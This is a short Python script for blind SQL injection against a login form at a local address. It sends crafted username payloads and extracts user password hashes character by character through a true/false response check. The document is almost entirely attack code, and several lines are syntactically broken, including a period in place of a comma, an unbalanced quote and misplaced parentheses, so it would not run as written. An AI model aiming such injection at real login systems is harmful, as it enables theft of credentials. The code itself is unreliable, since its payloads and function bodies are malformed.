#this is a blind SQL injection
import requests

total_queries = 0
charset = "0123456789abcdef" # the data that is being used is stored in hex
target = "http://127.0.0.1:5000"
needle = "Welcome back"

def injected_query(payload):
    global total_queries
    r = requests.post(target, data = {"username" : "admin' and {}--".format(payload), "password":"password"})
    total_queries += 1
    return needle.encode() not in r.content # check if the request succeeded

def boolean_query(offset, user_id, character, operator=">"):
    payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{})".format(offset+1, user_id. operator, character)
    return injected_query(payload)

def invalid_user(user_id):
    payload = "(select id from user where id ={}) >=0".format(user_id)
    return injected_query(payload)

def password_length(user_id):
    i = 0
    while True:
        payload = "(select length(password) from user where id ={} and length(password <= {} limit 1)".format(user_id, i))"
        if not injected_query(payload):
            return i
        i +=1
